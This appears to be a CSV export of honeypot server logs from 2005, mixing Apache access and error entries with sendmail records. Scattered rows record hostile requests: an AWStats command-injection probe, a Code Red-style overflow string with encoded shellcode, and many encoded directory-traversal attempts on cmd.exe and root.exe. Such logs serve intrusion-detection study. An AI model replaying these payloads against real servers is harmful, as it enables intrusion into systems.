,Epoch Date,Log Type,IP Adress,Log
397,1110863220,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
398,1110863220,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
399,1110863220,error_log,81.181.146.13,"[error] script not found or unable to stat: /var/www/cgi-bin/awstats
"
400,1110863220,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
401,1110863220,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
402,1110863220,error_log,81.181.146.13,"[error] File does not exist: /var/www/html/cgi
"
403,1110863221,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
404,1110863221,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
405,1110863221,error_log,81.181.146.13,"[error] File does not exist: /var/www/html/cgi
"
406,1110863221,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
407,1110863222,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
408,1110863222,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
409,1110863224,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
410,1110863224,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
411,1110868873,access_log,201.9.48.227," ""GET /default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a HTTP/1.0"" 404 1061 ""-"" ""-"""
412,1110868873,error_log,201.9.48.227,"[error] File does not exist: /var/www/html/default.ida
"
413,1110873194,access_log,217.204.59.69," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
414,1110873194,error_log,217.204.59.69,"[error] Directory index forbidden by rule: /var/www/html/
"
415,1110885842,access_log,218.6.162.19," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
416,1110885842,error_log,218.6.162.19,"[error] Directory index forbidden by rule: /var/www/html/
"
417,1110899269,access_log,24.11.17.100," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
418,1110899269,error_log,24.11.17.100,"[error] Directory index forbidden by rule: /var/www/html/
"
419,1110913113,access_log,65.96.54.37," ""GET /NULL.printer"" 404 1061 ""-"" ""-"""
420,1110913113,error_log,65.96.54.37,"[error] File does not exist: /var/www/html/NULL.printer
"
421,1110925233,access_log,195.70.152.248," ""GET /NULL.printer"" 404 1061 ""-"" ""-"""
422,1110925234,error_log,195.70.152.248,"[error] File does not exist: /var/www/html/NULL.printer
"
423,1110930324,access_log,62.6.139.11," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
424,1110930324,error_log,62.6.139.11,"[error] Directory index forbidden by rule: /var/www/html/
"
425,1110931788,access_log,211.158.94.106," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
426,1110931788,error_log,211.158.94.106,"[error] Directory index forbidden by rule: /var/www/html/
"
427,1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
428,1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
429,1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
430,1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
431,1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
432,1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
433,1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
434,1110934902,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
435,1110934902,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
436,1110934902,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
437,1110934902,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
438,1110934902,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
439,1110934902,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
440,1110934902,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
441,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
442,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
443,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
444,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
445,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
446,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
447,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
448,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
449,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
450,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
451,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
452,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
453,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
454,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
455,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
456,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
457,1110934903,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
458,1110934903,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
459,1110934903,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
460,1110934903,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
461,1110934903,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
462,1110934903,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
463,1110934903,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
464,1110934903,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
465,1110934903,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
466,1110934903,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
467,1110934903,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
468,1110934903,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
469,1110934903,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
470,1110934903,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
471,1110934903,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
472,1110934903,error_log,207.228.251.216,"[error] File does not exist: /var/www/html/sumthin
"
473,1110941142,access_log,218.11.95.43," ""GET /scripts/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
474,1110941142,error_log,218.11.95.43,"[error] File does not exist: /var/www/html/scripts
"
475,1110941146,access_log,218.11.95.43," ""GET /MSADC/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
476,1110941146,error_log,218.11.95.43,"[error] File does not exist: /var/www/html/MSADC
"
477,1110941150,access_log,218.11.95.43," ""GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
478,1110941150,error_log,218.11.95.43,"[error] File does not exist: /var/www/html/c
"
479,1110941154,access_log,218.11.95.43," ""GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
480,1110941154,error_log,218.11.95.43,"[error] File does not exist: /var/www/html/d
"
481,1110941155,access_log,218.11.95.43," ""GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
482,1110941155,error_log,218.11.95.43,"[error] File does not exist: /var/www/html/scripts
"
483,1110941160,access_log,218.11.95.43," ""GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
484,1110941160,error_log,218.11.95.43,"[error] File does not exist: /var/www/html/_vti_bin
"
485,1110941161,access_log,218.11.95.43," ""GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
486,1110941161,error_log,218.11.95.43,"[error] File does not exist: /var/www/html/_mem_bin
"
487,1110941162,access_log,218.11.95.43," ""GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
488,1110941162,error_log,218.11.95.43,"[error] File does not exist: /var/www/html/msadc
"
489,1110945731,mail_log,-,"combo sendmail[16094]: j2G92BTv016094: from=root, size=1194, class=0, nrcpts=1, msgid=<200503160902.j2G92BTv016094@combo.honeypotbox.com>, relay=root@localhost"
490,1110945752,mail_log,127.0.0.1,"combo sendmail[16097]: j2G92B6S016097: from=<root@combo.honeypotbox.com>, size=1508, class=0, nrcpts=1, msgid=<200503160902.j2G92BTv016094@combo.honeypotbox.com>, proto=ESMTP, daemon=MTA, relay=localhost.localdomain [127.0.0.1]"
491,1110945752,mail_log,127.0.0.1,"combo sendmail[16094]: j2G92BTv016094: to=root, ctladdr=root (0/0), delay=00:00:21, xdelay=00:00:21, mailer=relay, pri=30056, relay=[127.0.0.1] [127.0.0.1], dsn=2.0.0, stat=Sent (j2G92B6S016097 Message accepted for delivery)"
492,1110945752,mail_log,-,"combo sendmail[16098]: j2G92B6S016097: to=<root@combo.honeypotbox.com>, ctladdr=<root@combo.honeypotbox.com> (0/0), delay=00:00:00, xdelay=00:00:00, mailer=local, pri=31751, dsn=2.0.0, stat=Sent"
493,1110946432,mail_log,-,"combo sendmail[16309]: j2G9Cmag016309: from=root, size=39406, class=0, nrcpts=1, msgid=<200503160912.j2G9Cmag016309@combo.honeypotbox.com>, relay=root@localhost"
494,1110946449,mail_log,127.0.0.1,"combo sendmail[16311]: j2G9Dq6S016311: from=<root@combo.honeypotbox.com>, size=39702, class=0, nrcpts=1, msgid=<200503160912.j2G9Cmag016309@combo.honeypotbox.com>, proto=ESMTP, daemon=MTA, relay=localhost.localdomain [127.0.0.1]"
495,1110946449,mail_log,127.0.0.1,"combo sendmail[16309]: j2G9Cmag016309: to=root, ctladdr=root (0/0), delay=00:01:20, xdelay=00:00:17, mailer=relay, pri=30241, relay=[127.0.0.1] [127.0.0.1], dsn=2.0.0, stat=Sent (j2G9Dq6S016311 Message accepted for delivery)"
496,1110946449,mail_log,-,"combo sendmail[16312]: j2G9Dq6S016311: to=<root@combo.honeypotbox.com>, ctladdr=<root@combo.honeypotbox.com> (0/0), delay=00:00:00, xdelay=00:00:00, mailer=local, pri=69940, dsn=2.0.0, stat=Sent"
497,1110951640,access_log,69.67.42.139," ""GET /scripts/nsiislog.dll HTTP/1.1"" 404 1050 ""-"" ""-"""
498,1110951640,error_log,69.67.42.139,"[error] File does not exist: /var/www/html/scripts
"
499,1110953075,mail_log,61.73.91.96,combo sendmail[16488]: j2GB4Z6S016488: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
500,1110953083,mail_log,61.73.91.96,combo sendmail[16489]: j2GB4h6S016489: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
501,1110953083,mail_log,61.73.91.96,combo sendmail[16491]: j2GB4h6S016491: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
502,1110953083,mail_log,61.73.91.96,combo sendmail[16492]: j2GB4h6S016492: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
503,1110953083,mail_log,61.73.91.96,combo sendmail[16493]: j2GB4h6S016493: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
504,1110953083,mail_log,61.73.91.96,combo sendmail[16490]: j2GB4h6S016490: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
505,1110953083,mail_log,61.73.91.96,combo sendmail[16487]: j2GB4h6S016487: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
506,1110953083,mail_log,61.73.91.96,combo sendmail[16503]: j2GB4h6S016503: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
507,1110953083,mail_log,61.73.91.96,combo sendmail[16494]: j2GB4h6S016494: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
508,1110953083,mail_log,61.73.91.96,combo sendmail[16495]: j2GB4h6S016495: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
509,1110953083,mail_log,61.73.91.96,combo sendmail[16496]: j2GB4h6S016496: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
510,1110953083,mail_log,61.73.91.96,combo sendmail[16498]: j2GB4h6S016498: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
511,1110953083,mail_log,61.73.91.96,combo sendmail[16497]: j2GB4h6S016497: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
512,1110953083,mail_log,61.73.91.96,combo sendmail[16499]: j2GB4h6S016499: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
513,1110953083,mail_log,61.73.91.96,combo sendmail[16500]: j2GB4h6S016500: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
514,1110953083,mail_log,61.73.91.96,combo sendmail[16501]: j2GB4h6S016501: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
515,1110953083,mail_log,61.73.91.96,combo sendmail[16504]: j2GB4h6S016504: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
516,1110953083,mail_log,61.73.91.96,combo sendmail[16502]: j2GB4h6S016502: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
517,1110953083,mail_log,61.73.91.96,combo sendmail[16505]: j2GB4h6S016505: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
518,1110953083,mail_log,61.73.91.96,combo sendmail[16506]: j2GB4h6S016506: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
519,1110953083,mail_log,61.73.91.96,combo sendmail[16507]: j2GB4h6S016507: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
520,1110953083,mail_log,61.73.91.96,combo sendmail[16508]: j2GB4h6S016508: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
521,1110953084,mail_log,61.73.91.96,combo sendmail[16509]: j2GB4i6S016509: [61.73.91.96] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
522,1110953496,access_log,66.134.74.113," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
523,1110953496,error_log,66.134.74.113,"[error] Directory index forbidden by rule: /var/www/html/
"
524,1110958184,access_log,204.102.106.121," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
525,1110958184,error_log,204.102.106.121,"[error] Directory index forbidden by rule: /var/www/html/
"
526,1110962881,access_log,68.166.35.226," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
527,1110962881,error_log,68.166.35.226,"[error] Directory index forbidden by rule: /var/www/html/
"
528,1110963224,access_log,61.10.7.209," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
529,1110963224,error_log,61.10.7.209,"[error] Directory index forbidden by rule: /var/www/html/
"
530,1110965655,access_log,207.243.156.65," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
531,1110965655,error_log,207.243.156.65,"[error] Directory index forbidden by rule: /var/www/html/
"
532,1110969323,access_log,71.16.50.10," ""GET /scripts/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
533,1110969323,error_log,71.16.50.10,"[error] File does not exist: /var/www/html/scripts
"
534,1110969324,access_log,71.16.50.10," ""GET /MSADC/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
535,1110969324,access_log,71.16.50.10," ""GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
536,1110969324,error_log,71.16.50.10,"[error] File does not exist: /var/www/html/MSADC
"
537,1110969324,error_log,71.16.50.10,"[error] File does not exist: /var/www/html/c
"
538,1110969325,access_log,71.16.50.10," ""GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
539,1110969325,access_log,71.16.50.10," ""GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
540,1110969325,access_log,71.16.50.10," ""GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
541,1110969325,error_log,71.16.50.10,"[error] File does not exist: /var/www/html/d
"
542,1110969325,error_log,71.16.50.10,"[error] File does not exist: /var/www/html/scripts
"
543,1110969325,error_log,71.16.50.10,"[error] File does not exist: /var/www/html/_vti_bin
"
544,1110969326,access_log,71.16.50.10," ""GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
545,1110969326,access_log,71.16.50.10," ""GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
546,1110969326,access_log,71.16.50.10," ""GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
547,1110969326,error_log,71.16.50.10,"[error] File does not exist: /var/www/html/_mem_bin
"
548,1110969326,error_log,71.16.50.10,"[error] File does not exist: /var/www/html/msadc
"
549,1110969326,error_log,71.16.50.10,"[error] File does not exist: /var/www/html/scripts
"
550,1110969327,access_log,71.16.50.10," ""GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
551,1110969327,access_log,71.16.50.10," ""GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
552,1110969327,access_log,71.16.50.10," ""GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
553,1110969327,access_log,71.16.50.10," ""GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
554,1110969327,error_log,71.16.50.10,"[error] File does not exist: /var/www/html/scripts
"
555,1110969327,error_log,71.16.50.10,"[error] File does not exist: /var/www/html/scripts
"
556,1110969328,access_log,71.16.50.10," ""GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
557,1110969328,access_log,71.16.50.10," ""GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
558,1110969328,access_log,71.16.50.10," ""GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
559,1110969328,error_log,71.16.50.10,"[error] File does not exist: /var/www/html/scripts
"
560,1110969328,error_log,71.16.50.10,"[error] File does not exist: /var/www/html/scripts
"
561,1110976930,access_log,66.171.199.116," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
562,1110976930,error_log,66.171.199.116,"[error] Directory index forbidden by rule: /var/www/html/
"
563,1110979420,access_log,64.83.24.184," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
564,1110979420,error_log,64.83.24.184,"[error] Directory index forbidden by rule: /var/www/html/
"
565,1110980816,access_log,66.30.71.74," ""GET /NULL.printer"" 404 1061 ""-"" ""-"""
566,1110980816,error_log,66.30.71.74,"[error] File does not exist: /var/www/html/NULL.printer
"
567,1110983346,access_log,208.62.177.10," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
568,1110983346,error_log,208.62.177.10,"[error] Directory index forbidden by rule: /var/www/html/
"
569,1110983368,access_log,209.120.201.177," ""GET /scripts/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
570,1110983368,error_log,209.120.201.177,"[error] File does not exist: /var/www/html/scripts
"
571,1110983369,access_log,209.120.201.177," ""GET /MSADC/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
572,1110983369,error_log,209.120.201.177,"[error] File does not exist: /var/www/html/MSADC
"
573,1110983371,access_log,209.120.201.177," ""GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
574,1110983371,error_log,209.120.201.177,"[error] File does not exist: /var/www/html/c
"
575,1110983372,access_log,209.120.201.177," ""GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
576,1110983372,error_log,209.120.201.177,"[error] File does not exist: /var/www/html/d
"
577,1110983373,access_log,209.120.201.177," ""GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
578,1110983373,error_log,209.120.201.177,"[error] File does not exist: /var/www/html/scripts
"
579,1110983374,access_log,209.120.201.177," ""GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
580,1110983374,error_log,209.120.201.177,"[error] File does not exist: /var/www/html/_vti_bin
"
581,1110983375,access_log,209.120.201.177," ""GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
582,1110983375,error_log,209.120.201.177,"[error] File does not exist: /var/www/html/_mem_bin
"
583,1110983376,access_log,209.120.201.177," ""GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
584,1110983376,error_log,209.120.201.177,"[error] File does not exist: /var/www/html/msadc
"
585,1110983378,access_log,209.120.201.177," ""GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
586,1110983378,error_log,209.120.201.177,"[error] File does not exist: /var/www/html/scripts
"
587,1110983379,access_log,209.120.201.177," ""GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
588,1110983381,access_log,209.120.201.177," ""GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
589,1110983381,error_log,209.120.201.177,"[error] File does not exist: /var/www/html/scripts
"
590,1110983382,access_log,209.120.201.177," ""GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
591,1110983382,error_log,209.120.201.177,"[error] File does not exist: /var/www/html/scripts
"
592,1110983383,access_log,209.120.201.177," ""GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
593,1110983384,access_log,209.120.201.177," ""GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
594,1110983385,access_log,209.120.201.177," ""GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
595,1110983385,error_log,209.120.201.177,"[error] File does not exist: /var/www/html/scripts
"
596,1110983386,access_log,209.120.201.177," ""GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
597,1110983386,error_log,209.120.201.177,"[error] File does not exist: /var/www/html/scripts
"
598,1110987905,access_log,65.16.76.54," ""POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1"" 404 1062 ""-"" ""-"""
599,1110987905,error_log,65.16.76.54,"[error] File does not exist: /var/www/html/_vti_bin
"
600,1110988230,access_log,65.16.76.54," ""POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1"" 404 1062 ""-"" ""-"""
601,1110988230,error_log,65.16.76.54,"[error] File does not exist: /var/www/html/_vti_bin
"
602,1110997397,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
603,1110997397,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
604,1110997397,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
605,1110997397,error_log,218.85.9.143,"[error] Directory index forbidden by rule: /var/www/html/
"
606,1110997397,error_log,218.85.9.143,"[error] Directory index forbidden by rule: /var/www/html/
"
607,1110997398,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
608,1110997398,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
609,1110997398,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
